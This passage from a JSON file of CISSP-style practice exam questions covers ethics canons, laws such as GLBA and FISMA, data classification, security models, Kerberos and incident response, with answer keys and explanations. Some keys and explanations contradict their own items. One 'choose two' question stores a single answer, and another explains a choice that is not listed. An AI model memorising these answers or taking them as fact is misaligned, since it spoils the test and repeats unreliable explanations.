      "explanation": "Option 2 is correct. An organization's Acceptable Use Policy (AUP) defines what governs an employee's use of the organization's assets. It covers a wide range of issues surrounding the employee's rights and responsibilities as well as sanctions for cases of non-adherence. The ISC2 code of ethics (1) applies to individuals who have signed the ISC2 NDA which includes the code of ethics, generally, all the CISSPs need to adhere to the ISC2 code of ethics NDA or a confidentiality agreement (3) is a contract through which the parties agree not to disclose any information covered by the agreement. In the above case, you have not shared the Organization's Private information with anyone. SLA (4) is a formal agreement between the service provider and the client which defines the specific responsibilities of the service provider and sets the customer expectations. It includes the Performance and Reporting expectations, which do not fit the above scenario."
    },
    {
      "id": "d1-q55",
      "domain": "1. Security and Risk Management",
      "stem": "Which canon in the (ISC)2 code of ethics states that security professionals should execute their duties in a manner that is honorable, honest, just, responsible, and legal?",
      "choices": [
        "The first",
        "The second",
        "The third",
        "The fourth"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. (ISC)2 code of ethics has four canons. The canons have been arranged based on their order of importance. The second canon is \"act honorably, honestly, justly, responsibly, and legally.\" The first canon is \"protect society, the common good, necessary public trust and confidence, and the infrastructure,\" the third canon is \"provide diligent and competent service to principals,\" and the fourth canon is \"advance and protect the profession.\""
    },
    {
      "id": "d1-q56",
      "domain": "1. Security and Risk Management",
      "stem": "Feng, a security administrator in a college, has been tasked with creating a student information system that ensures no student information can be altered. The principle of information security that Feng should implement is called____________?",
      "choices": [
        "Integrity",
        "Confidentiality",
        "Availability",
        "Denial"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Integrity controls ensure that information can only be modified by authorized individuals. In this example, Feng should enforce integrity control. He can test the code to make sure that no one can alter student information such as student grades, and any other sensitive information. Option 2, confidentiality, ensures information remains private or secret, while option 3, availability, makes sure that the stored information is available whenever it is needed and can be accessed within a reasonable time. Options 1, 2, and 3 are all parts of the CIA triad. Option 4, distributed denial of service (DDoS), takes place when several machines collaborate to attack a common target."
    },
    {
      "id": "d1-q57",
      "domain": "1. Security and Risk Management",
      "stem": "You have recently been hired as a CISO in a multinational business. You've already studied the business's mission, vision, goals, corporate strategy, and business and security needs, and you want to develop the business's information security strategy. Which option should you do first?",
      "choices": [
        "Develop the company's information security program policy.",
        "Consider constraints and resources.",
        "Do a risk assessment.",
        "Determine the milestones and blueprint."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. As a CISO, your first assignment should be to conduct a risk assessment (gap analysis) which will help you address the gaps in the company's security program. Options 1, 2, and 4 are incorrect because developing the company's information security program policy, consideration of constraints and resources, and determination of milestones and blueprint can only be done after identifying the potential risks."
    },
    {
      "id": "d1-q58",
      "domain": "1. Security and Risk Management",
      "stem": "The _______ law requires banks to share privacy notices with their customers in written form?",
      "choices": [
        "GLBA",
        "HITECH",
        "HIPAA",
        "FERPA"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The Gramm-Leach – Bliley Act (GLBA) lays down some stringent privacy regulations for financial institutions, and among those regulations is the requirement for financial institutions to provide their customers with written notices concerning privacy practices. Option 2 is not correct because the HITECH Act's aim is to enhance the security of healthcare data by ensuring that healthcare providers embrace electronic health records. Option 3 is not correct because the HIPAA Act's main objective is to ensure the privacy of sensitive data concerning a patient's health. Option 4 is not correct because the FERPA Act grants parents some rights to access data concerning their children's academics."
    },
    {
      "id": "d1-q59",
      "domain": "1. Security and Risk Management",
      "stem": "Which type of investigation is conducted internally against an employee when they violate their enterprise's policies?",
      "choices": [
        "Criminal investigation",
        "Civil investigation",
        "Administrative investigation",
        "Regulatory investigation"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. An organization conducts an administrative investigation if an employee is suspected to have violated an organizational policy. A criminal investigation is the responsibility of the government whenever they suspect a violation of its regulations. A civil investigation is carried out by citizens in a civil suit. A regulatory investigation involves a regulatory body (for example, EPA or FTC)."
    },
    {
      "id": "d1-q60",
      "domain": "1. Security and Risk Management",
      "stem": "An employee is drafting a document that will provide detailed information on how a security system in the business will be implemented. Which document is being prepared?",
      "choices": [
        "Guideline",
        "Policy",
        "Procedure",
        "Baseline"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A procedure (also known as a security procedure) gives a detailed highlight of how a security system will be implemented within an organization. A procedure is developed for each task that an organization performs in accordance with the standards, guidelines, and baselines. A guideline shows how baselines and security standards can be enforced. A policy highlights what needs protection and to what extent it should be protected. A baseline refers to the minimum security standard that should be enforced on an infrastructure."
    },
    {
      "id": "d1-q61",
      "domain": "1. Security and Risk Management",
      "stem": "Which option is not one of the important roles that a senior manager can play on a business continuity planning team?",
      "choices": [
        "Acting as an arbitrator when disputes occur among members.",
        "Setting priorities for the team.",
        "Obtaining resources for the team.",
        "Training staff."
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Senior managers play several critical roles during the business continuity planning process. For instance, they ensure the planning team has all the resources that they need, set priorities, and act as arbitrators in the event of any disputes among team members. Therefore, options 1, 2, and 3 are all roles played by a senior manager, option 4 is not. Training staff is the work of the human resource department."
    },
    {
      "id": "d1-q62",
      "domain": "1. Security and Risk Management",
      "stem": "Which option agreements remains binding to an employee even after they have left the enterprise?",
      "choices": [
        "Job agreement",
        "Acceptable Usage Policy (AUP)",
        "Non-Disclosure Agreement (NDA)",
        "Privacy Policy Agreement"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A Non-Disclosure Agreement is meant to guard any confidential information of an organization. As an information security officer, being party to this agreement means that you will not in any way share confidential information of the organization even after the end of your contract, be it through retirement, termination, or resignation. Option 2 is not correct since a Non-Compete Agreement stops an employee from serving another organization that is considered a competitor. Option 1 is not correct because a job agreement or employment contract states the terms of employment of the employee. Option 4 is not correct because a Privacy Policy Agreement basically tells users the kind of information they are required to provide."
    },
    {
      "id": "d1-q63",
      "domain": "1. Security and Risk Management",
      "stem": "An employee is investigating a security incident where it was discovered that an attacker created a fake user account to take advantage of the system vulnerability and grant administrative rights to that account. In reference to the STRIDE model, these types of attacks can be referred to as __________ and _________. (Choose TWO of the following answer options.)?",
      "choices": [
        "Tampering",
        "Information disclosure",
        "Elevation of privileges",
        "Spoofing"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "The correct answers are options 3 and 4. First, the hacker gained access to the system using false credentials. This is called spoofing (4). The fake credentials could be a fake username, e-mail, password, SSID, IP address, etc. When the spoofed credentials are fed into the system, it assumes that they are legitimate and grants access. Secondly, the hacker upgraded the limited user account and provided it with administrator powers. This is called elevation of privileges (3). Option 1 is not correct because tampering attacks attempt to interfere with the integrity of resources or data. Option 2 is not correct because information disclosure refers to a situation where a system accidentally reveals classified data to the users."
    },
    {
      "id": "d1-q64",
      "domain": "1. Security and Risk Management",
      "stem": "An employee wants to develop a business continuity plan, but they are not sure which resources to prioritize due to the challenge of putting together information about intangible and tangible assets. Which risk assessment approach would you advise them to apply?",
      "choices": [
        "Qualitative risk assessment",
        "Quantitative risk assessment",
        "Both qualitative and quantitative risk assessments",
        "Neither qualitative nor quantitative risk assessment"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. They would experience the best outcome by applying a combination of both qualitative and quantitative risk assessment elements. Qualitative risk assessment does a good job of handling intangible risks, while quantitative risk assessment works excellently in analyzing financial (or other tangible) risks. Option 1 and option 2 are incorrect since both quantitative and qualitative risk assessments have their own limitations related to the resource and information requirements for analytical or data models. Therefore, they should combine the two to make their opportunity and risk more predictable. option 4 is not correct since they must apply at least one or both of these risk assessment approaches."
    },
    {
      "id": "d1-q65",
      "domain": "1. Security and Risk Management",
      "stem": "Which option enterprises is most likely to be impacted by the provisions of FISMA?",
      "choices": [
        "Hospitals",
        "School districts",
        "Defense contractors",
        "Financial institutions"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. The Federal Information Security Management Act (FISMA) applies to federal government contractors as well as agencies. The law which came into existence in 2002 requires federal contractors and agencies to devise a program that guarantees information security and protection, and documents and executes it. Among the mentioned entities, the one that is likely to operate subject to FISMA is the defense contractor. Option 1 is not correct because hospitals are affected by the Health Insurance Portability and Accountability Act (HIPAA). Option 2 is not correct because school districts are likely to be impacted by the Family Education Rights and Privacy Act (FERPA). Option 4 is not correct because financial institutions, such as banks, are required to comply with the Gramm-Leach-Billey Act (GLBA)."
    },
    {
      "id": "d1-q66",
      "domain": "1. Security and Risk Management",
      "stem": "A bank has come up with a security program that will equip its employees with skills related to their specific duties at work. This kind of security program is called____________?",
      "choices": [
        "Education",
        "Training",
        "Due care",
        "Awareness"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. A security training program is meant to equip employees with skills and knowledge that are specific to their roles at work. This is often designed for people who share similar job specifications. Option 1 is not correct because education is giving people further teachings, beyond that which they need for everyday work. Option 3 is not correct because due care refers to measures taken by a company to make sure that its employees and assets are protected and secured and that the top management has sufficiently assessed and assumed all transferred or unmitigated risks. Education, training, and awareness form part of a company's due care. Option 4, Awareness, refers to the act of helping the employees to familiarize themselves with security and understanding their role as stipulated in the policy as well as any activities they are not supposed to engage in."
    },
    {
      "id": "d2-q31",
      "domain": "2. Asset Security",
      "stem": "A top-ranking U.S. military officer is tasked with securing some sensitive information, the exposure of which might result in a serious threat to national security. In reference to the U.S. standards of data classification, this data should be classified as_________?",
      "choices": [
        "Secret",
        "Confidential",
        "Top secret",
        "Unclassified"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. because if secret data leaks, the harm will be serious damage. Option 3 is not correct because according to the U.S. government's standards of data classification, top-secret data is the most guarded because, if it leaks, it can result in an exceptionally grave national security threat of a very high magnitude. Option 2 is not correct because confidential data is proprietary. Option 4 is not correct since unclassified data can be accessed by any member of the public."
    },
    {
      "id": "d2-q32",
      "domain": "2. Asset Security",
      "stem": "After having a computer in service for a certain period, you may decide to dispose of it. Before disposing of the computer, you are required to destroy or remove all the storage media through a process called ___________?",
      "choices": [
        "Declassification",
        "Destruction",
        "Purging",
        "Sanitization"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Generally, the process employed in removing data from a media or system is called sanitization. When disposing of a computer, sanitization may include erasing or destroying media, drives, and all the other storage devices in place. Option 1 is not correct because declassification refers to any process applied in purging any media or system to make it ready for use in an unclassified environment. Option 2 is not correct because destruction refers to a method that is used to completely destroy media to ensure that no data can be extracted from it. Option 3 is not correct because purging refers to a more intense method of clearing data from media to prepare it for utilization in environments that are less secure."
    },
    {
      "id": "d2-q33",
      "domain": "2. Asset Security",
      "stem": "A security officer for a multinational enterprise has been assigned the responsibility of labeling several important files by embedding data on them. This type of label is referred to as_____________________?",
      "choices": [
        "Steganography",
        "Digital watermark",
        "Data Loss Prevention (DLP)",
        "Copyright notice"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. A digital watermark refers to a type of marker that is embedded in media such as images, videos, or audio to label it or help identify the file owner. Option 1 is not correct because steganography refers to the science applied to hiding information, usually in files or images. Option 3 is not correct because (DLP) Data Loss Prevention is a remedy that was developed to ensure data is not lost. Option 4 is not correct because a copyright notice offers information concerning the copyright asserted on a file."
    },
    {
      "id": "d2-q34",
      "domain": "2. Asset Security",
      "stem": "An employee of an international financial institution would like to gain access to some critical customer information in order to serve a client as illustrated in the diagram below. Which option data roles will grant them access to the data they want?",
      "choices": [
        "Administrators",
        "Users",
        "Data processors",
        "Data sharing"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The illustration above represents a staff gaining access to data. Administrators are responsible for giving personnel access to data. Options B and C represent other data roles. User refers to any individual who utilizes a computing system to gain access to data to accomplish a certain role. Data processors refer to any system that can be utilized in processing data. Option 4 is not correct since data sharing is not a data role."
    },
    {
      "id": "d2-q35",
      "domain": "2. Asset Security",
      "stem": "A CEO has purchased new computers for their enterprise. However, they have been instructed by their employees not to dispose of the old computers because they still have information that is considered useful to the enterprise. The computers can only be disposed of when the information is no longer needed. Which element of asset retention is this?",
      "choices": [
        "Personnel retention",
        "Record retention",
        "Media retention",
        "Data corruption"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Record retention describes the practice whereby important information is retained for the period of time in which it is still considered useful and only thereafter destroyed. In this scenario, 'the CEO's act is an example of record retention. Option 1 is not correct since personnel retention refers to the knowledge that was acquired by an employee while working in an organization. Option 3 is not correct because media retention refers to the keeping of spoilt media components to ensure data privacy. Option 4 is not correct because data corruption is not an element of data retention."
    },
    {
      "id": "d2-q36",
      "domain": "2. Asset Security",
      "stem": "An individual is purchasing some items on an e-commerce platform using their credit card. The state of data involved in the transaction can be described as ______?",
      "choices": [
        "Data in use",
        "Data at rest",
        "Data in transit",
        "Both data at rest and in transit"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Data in part of an e-commerce transaction can be classified as data in transit since it's moving between the parties involved. For example, when making an online payment using a credit card, the payment information is transferred from the buyer to the e-commerce system. Option 1 is not correct because data in use refers to data that is currently being processed by a computing system. Option 2 is not correct because data at rest is data that is not active and is stored physically. Option 4 is not correct since data at rest is not involved in the transaction."
    },
    {
      "id": "d3-q38",
      "domain": "3. Security Architecture and Engineering",
      "stem": "A security administrator in a financial auditing business is required to enforce access controls to make sure that users do not gain access as per their earlier activity. For instance, after a consultant has accessed data owned by one of their clients, they may not have access to any data belonging to that client's competitors. The security model that matches this need is___________?",
      "choices": [
        "Brewer - Nash",
        "Bell-LaPadula",
        "Biba",
        "Clark-Wilson"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Brewer–Nash is a security model in which access controls can undergo dynamic changes depending on the actions of the user. This model is often applied in scenarios that are similar to those in the above scenario to enforce a \"Chinese wall\" that ensures a subject does not access data from various clients of similar interests. Options 2, 3, and 4 are also security models but cannot be applied in this environment. With the Bell-LaPadula Model, every subject is assigned a security clearance level, while a security level is assigned to each object. The Biba Model makes it hard to modify data by employing two properties: an integrity property and a simple integrity property. The Clark-Wilson Model ensures that a subject uses a program to access an object"
    },
    {
      "id": "d3-q39",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An employee would like to conduct threat modeling for their enterprise to improve the security of their systems. They have opted to apply the Process for Attack Simulation and Threat Analysis (PASTA) methodology, which follows a seven-step approach to identify the potential threats and vulnerabilities to a system and the available countermeasures. Using this methodology, what should the employee do first?",
      "choices": [
        "Analyze risks and management",
        "Define the objectives for the risk analysis",
        "Analyze strengths",
        "Define the technical scope"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The PASTA (Process for Attack Simulation and Threat Analysis) methodology has seven steps. The first step is focused on the definition of objectives. Option 1 is not correct because risk and impact analysis is the last step. Option 3 is not correct because analyzing strengths is not one of the steps in the PASTA methodology. Option 4 is not correct because the definition of technical scope is the second step. The third PASTA step involves decomposing and analyzing the application, the fourth step is threat analysis, the fifth step involves analyzing vulnerabilities and weaknesses, and the sixth step is analyzing modeling and simulation."
    },
    {
      "id": "d1-q67",
      "domain": "1. Security and Risk Management",
      "stem": "You work as a CISO in an enterprise. The enterprise wants to purchase new computers and some software for their new branch. You have been tasked with conducting a security assessment of potential vendors that have shown interest in supplying the products. Which option is NOT part of the process you will complete to determine the right vendor?",
      "choices": [
        "Ask the vendor to provide a third-party audit report.",
        "Plan a visit to the vendor’s offices. While there, pose some questions to the managers and employees regarding their security policies.",
        "Review the vendor's catalogs and compare prices to determine which vendor offers the best price.",
        "Review the vendor's documents, such as operating documentation, baselines, standards, and policies."
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Before the procurement department purchases new products, it should first ensure that the vendor is an entity that can be trusted. This can be done through a security assessment of various vendors that have shown interest in doing business with your organization before final selection. Security assessment of vendors may include reviewing the vendor's third-party audit report (1), which must be based on a framework that resonates with the organization's objectives. The CISO may also pay a surprise site visit to the vendor's premises (2) in order to gain firsthand experience with their operation (to determine whether they adhere to security policies, for example). The vendor's operating documents, such as operating documentation, baseline, standards, and policies (4), can also be checked to find out whether they have aligned with security best practices. However, comparing vendors' prices and catalogs (3) is not part of the security assessment."
    },
    {
      "id": "d3-q40",
      "domain": "3. Security Architecture and Engineering",
      "stem": "An insurance business's database containing client information was recently compromised by an attacker. However, this did not affect their services since they had backed up the information on another machine. This property is known as ____________?",
      "choices": [
        "Virtualization",
        "Fault tolerance",
        "Memory protection",
        "Authorization"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Virtualization, fault tolerance, memory protection, and trusted platform modules form part of the security capabilities of information systems. Fault tolerance refers to the ability of a system to continue operating properly despite the failure of one or more of its components. Option 1 is not the correct answer because virtualization refers to the technology applied in hosting single or multiple operating systems in one host computer’s memory. Option 3 is not correct since memory protection refers to a critical portion of security that must be designed and enforced within an operating system. Option 4, authorization is not part of the security capabilities of security systems, making it an incorrect answer."
    },
    {
      "id": "d3-q41",
      "domain": "3. Security Architecture and Engineering",
      "stem": "One employee's primary responsibility is to ensure that all of the business’s web-based applications are secure. They are planning a workshop to educate developers on the most common security vulnerabilities of web applications. From which source can they get a proper list of the most common issues related to web applications?",
      "choices": [
        "Cloud Security Alliance (CSA)",
        "Open Web Application Security Project (OWASP)",
        "Global Data Alliance (GDA)",
        "National Security Administration (NSA)"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. The Open Web Application Security Project (OWASP) produces a listing of the ten most common security vulnerabilities of web applications every year, which security professionals and developers worldwide utilize for training and education needs. The issues listed by OWASP guide most of the security testing for web application products. Option 1 is not correct since the CSA’s (Cloud Security Alliance) main aim is to define and raise awareness pertaining to security matters in cloud computing. Option 4 is not correct because the NSA (National Security Agency) mainly focuses on guarding national communication systems integrity as well as gathering and processing data concerning secret communications that involve foreign adversaries to strengthen national security as well as foreign policy. Option 3, Global Data Alliance, is not part of cyber security associations."
    },
    {
      "id": "d5-q39",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "A business hosts part of its server within the enterprise's data center and the rest in the cloud. Can they apply Identity as a Service (IdaaS) to support identity needs?",
      "choices": [
        "Yes",
        "No"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Identity as a Service can be used by any system. The identity verification not have to originate from within a 'cloud' to be answered by the cloud."
    },
    {
      "id": "d5-q40",
      "domain": "5. Identity and Access Management (IAM)",
      "stem": "Key Distribution Center, Ticket Granting Ticket are important components of which authentication protocol?",
      "choices": [
        "Kerberos",
        "RADIUS",
        "TACACS+",
        "OAuth"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Windows utilizes Kerberos for authentication. Option 2 is not correct because RADIUS is utilized for network devices, modems, and wireless networks. Option 3 is not correct since TACACS+ is applied in the case of network devices. Option 4 is not correct as OAuth is mainly applied to web applications."
    },
    {
      "id": "d6-q50",
      "domain": "6. Security Assessment and Testing",
      "stem": "A contractor was brought in to develop a banking application. They are aware that some clients may attempt to withdraw money in excess of that which exists in their accounts. As a security measure, they enforce a code to secure the application. Which type of software testing can they apply to be sure that the application is secure?",
      "choices": [
        "Code review",
        "Mutation fuzzing",
        "Application vulnerability review",
        "Misuse case testing"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. Misuse case testing refers to the evaluation of software against some known abuses that an attacker might use to determine whether it can be successful in the proposed code. Option 2 is not correct because mutation fuzzing applies bit flipping, among other strategies, to implement slight modifications to earlier inputs to a program in trying to ascertain whether there are any software inefficiencies. Option 1 is not correct because code review mainly refers to a process where developers, other than the one who developed an application, review it against any faults. Option 3 is not correct since it's not a form of application vulnerability testing."
    },
    {
      "id": "d6-q51",
      "domain": "6. Security Assessment and Testing",
      "stem": "An employee is scanning a network port of a web server used in his business. They are using an external network to run the scan because they want to get the perspective of a hacker. Which option results should worry them?",
      "choices": [
        "1433/open",
        "443/open",
        "22/filtered",
        "80/open"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. An open port is a sign of a looming security risk (risk indicator). Port 1433 is never expected to be open since it is a database port and is not required to have any exposure to an external network. The only ports that should be open on the web server are ports 443 and 80. So, there is no need to worry if these are open. Therefore, options 2 and 4 are incorrect. Option 3 is not correct since it indicates that some filtering may be taking place on the port, so you can’t use it at the moment."
    },
    {
      "id": "d6-q52",
      "domain": "6. Security Assessment and Testing",
      "stem": "An ethical hacker in a medium-sized corporation has been tasked with assessing the security of the corporation's systems and prepare a penetration test report. Which option information is not necessary for the report?",
      "choices": [
        "Ways of dealing with any issue discovered",
        "Ratings for any identified vulnerabilities",
        "Any sensitive information gathered during the testing",
        "All identified issues"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. A penetration testing report does not usually include sensitive information gathered during the assessment since the data might be accessed by readers who are not authorized to access it, and when the report is exposed, it could land the organization at more risk. Remediation strategies of discovered issues, ratings of the vulnerabilities, and a list of the discovered vulnerabilities are all common components of a penetration test report. Therefore, options 1, 2, and 4 are incorrect."
    },
    {
      "id": "d6-q53",
      "domain": "6. Security Assessment and Testing",
      "stem": "An employee has been tasked with helping their enterprise choose audit standards that the enterprise will adhere to in all its branches. Which option IT standards are they not likely to suggest?",
      "choices": [
        "ISO/IEC (International Standards Organization/International Electrotechnical Committee) 27002",
        "COBIT",
        "Statement of Standards for Attestations Engagement (SSAE)-16",
        "ITIL"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. ITIL, initially referred to as IT Infrastructure Library, is not applied in auditing; it is a set of IT management practices. ISO/IEC 27002, COBIT (Control Objectives for Information and Related Technology), as well as SSAE–16 (The Statement on Standards for Attestation Engagements number 16 form part of IT standards utilized in auditing."
    },
    {
      "id": "d7-q39",
      "domain": "7. Security Operations",
      "stem": "___________evidence is made of tangible items that may be presented in a court of law during a judicial proceeding?",
      "choices": [
        "Testimonial",
        "Real",
        "Beyond reasonable doubt",
        "Documentary"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Items that may be brought before a court of law are referred to as real evidence. They may include biometric devices, weapons, or hard disks. Option 1 is not correct since testimonial evidence is evidence presented by word of mouth. Option 3 is not correct because beyond reasonable doubt refers to a standard of proof and not a type of evidence. Option 4 is a type of evidence that refers to written items that may not be in physical form."
    },
    {
      "id": "d7-q40",
      "domain": "7. Security Operations",
      "stem": "Which option is NOT a basic preventive measure that an enterprise can implement to ensure the security of their applications and systems?",
      "choices": [
        "Run forensic imaging of the entirety of their systems and applications.",
        "Get rid of accounts and services that are not required.",
        "Ensure that updated patch levels are maintained in all their applications and operating systems.",
        "Enforce a system to detect and prevent intrusion."
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. Forensic imaging is not a part of preventive measures. Instead, this is performed in the process of responding to an incident. Removing accounts and services that are not in use, maintaining updated patch levels, and enforcing a system that can detect and prevent intrusions are all primary preventive measures."
    },
    {
      "id": "d7-q41",
      "domain": "7. Security Operations",
      "stem": "The system administrator has been assigned the responsibility of ensuring that the recently acquired computers meet the various requirements of the enterprise. Which configuration management method will he enforce first?",
      "choices": [
        "Automation",
        "Baselining",
        "Provisioning",
        "Separation of duties"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. Baselining is the starting point for a system configuration. It ensures that a system is deployed in a particular manner or using a specific configuration. Option 1 is not correct because automation makes sure that the configuration deployed on each device can be tracked. Option 3 is not correct because provisioning is a configuration method that ensures that device users are granted access to the privileges across the systems in a streamlined manner. Options 1, 2, and 3 are all methods of configuration management. Option 4 is not correct because separation of duties is a way of reducing fraud and not a method used in configuration management."
    },
    {
      "id": "d7-q42",
      "domain": "7. Security Operations",
      "stem": "The CISO for a bank has been tasked with the responsibility of enforcing a new security principle that will grant employees administrative privileges within the banking system. They have designed the process in such a manner that employees will require approval from the bank's Chief Financial Officer and the General Manager to access the system. Which security mechanism has the CISO implemented?",
      "choices": [
        "Job rotation",
        "Need-to-know",
        "Mandatory vacations",
        "Two-man rule"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. In this case, the CISO has developed a mechanism that requires the approval of two individuals before a sensitive action can be executed. The principle is referred to as the two-man rule or two-person control. Option 1 is not correct because job rotation (also known as the rotation of duties) allows employees to rotate through various job responsibilities as a way of cross-training and ensuring minimal fraud. Option 2 is not correct because need-to-know is a principle that ensures that employees can only access resources that are required to accomplish their specific job roles. Option 3 is not correct because mandatory vacation refers to a process wherein an employee is subjected to a compulsory vacation of about one or two weeks to give space for peer review or fraud detection."
    },
    {
      "id": "d7-q43",
      "domain": "7. Security Operations",
      "stem": "Your business has some computers that have reached the end of their lifecycle and you want to donate them to the nearest public library where they will still be useful. What should you do before giving away the computers?",
      "choices": [
        "Install the computer's original software",
        "Sanitize the computers",
        "Withdraw the software licenses",
        "Get out all the DVDs and CDs from the computer"
      ],
      "correctIndex": 1,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 2 is correct. After reaching the end of their lifecycle, all systems need to be sanitized to remove all sensitive information. Option 1 is not correct because the installation of the original software of a computer is not a necessity unless it forms part of an organization's sanitization requirements. Option 3 is not correct because withdrawal is also unnecessary in sanitization. Option 4 is not correct because the removal of DVDs or CDs from a computer is just a portion of sanitization, which should be accompanied by checking other elements to make sure no data is left behind."
    },
    {
      "id": "d7-q44",
      "domain": "7. Security Operations",
      "stem": "Administrators play an active role in curbing the scope or impact of an incident during the ___________ phase of incident response?",
      "choices": [
        "Recovery",
        "Response",
        "Versioning",
        "Mitigation"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. During the mitigation phase of incident response, the primary focus is usually on what can be done to reduce the extent of damage caused by an incident. Some of the actions during this phase include those limiting the efficacy and scope of an incident. Option 1 is not correct because recovery refers to the process whereby the system is transformed into its normal state. Option 2 is not correct because response refers to how the incident is received and acted upon. Option 3 is not correct because versioning is not part of the procedures in incident response."
    },
    {
      "id": "d7-q45",
      "domain": "7. Security Operations",
      "stem": "The security officer in a medium-sized enterprise wants to deploy a deliberate false loophole that can be used to trap intruders in their systems. Which option can they utilize to achieve this?",
      "choices": [
        "Darknet",
        "Warning banner",
        "Pseudoflaw",
        "Honeynet"
      ],
      "correctIndex": 2,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 3 is correct. Pseudoflaws refer to loopholes or false vulnerabilities that are created intentionally with the aim of tempting attackers. Option 1 is not correct because a darknet refers to a portion of network address space that is idle without network activity and can be utilized in spying on any unauthorized activity. Option 2 is not correct because a warning banner refers to a legal device that plays the role of alerting attackers that they do not have permission to log into a system. Option 4 is not correct because a honeynet is a chain of several honeypots that work together to simulate a system."
    },
    {
      "id": "d7-q46",
      "domain": "7. Security Operations",
      "stem": "Three of the following are activities that are undertaken during the patch management process. Which one is NOT?",
      "choices": [
        "Auditing of patches",
        "Evaluation of patches",
        "Testing of patches",
        "Deployment of all patches"
      ],
      "correctIndex": 3,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 4 is correct. An organization is only required to deploy patches that are necessary. Option 1 is not correct because auditing is done to find out whether patches have been applied to the organization's systems. Option 2 is not correct because an evaluation of patches is done within an organization to determine what patches are needed. Option 3 is not correct because patches are usually tested to see whether they can cause any unforeseen issues to the systems."
    },
    {
      "id": "d7-q47",
      "domain": "7. Security Operations",
      "stem": "A technician in an enterprise receives complaints from employees about a network issue; they decide to troubleshoot it and discover that the problem is the result of a closed port. After opening the port, the issue is resolved. Later, an attacker is able to hack their systems after accessing that port. Which management process was the technician supposed to follow to avoid such an incident?",
      "choices": [
        "Change management process",
        "Vulnerability management process",
        "Patch management process",
        "Configuration management process"
      ],
      "correctIndex": 0,
      "difficulty": 0.0,
      "discrimination": 1.0,
      "explanation": "Option 1 is correct. The technician was supposed to adhere to the change management process by first evaluating the change, then implementing it. This helps avoid unforeseen system failure or the weakening of security. Option 2 is not correct because the vulnerability management process ensures systems are not subjected to common or known vulnerabilities. Option 3 is not correct because the patch management process checks that the systems are updated. Option 4 is not correct because the configuration management process makes sure that the deployed systems are similar. Apart from change management, the remaining processes cannot stop unauthorized changes."
    },
    {
      "id": "d7-q48",
      "domain": "7. Security Operations",
      "stem": "An employee is responsible for backing up their enterprise's main file server. According to their backup plan, full backups are performed every Wednesday at 11:00 pm, while differential backups happen at similar times during all other days. The table below shows how the files change. With reference to the information on the table, how many files will be copied during Friday's backup?",
      "choices": [
        "Six",
        "Five",
        "Three",
        "Two"
      ],
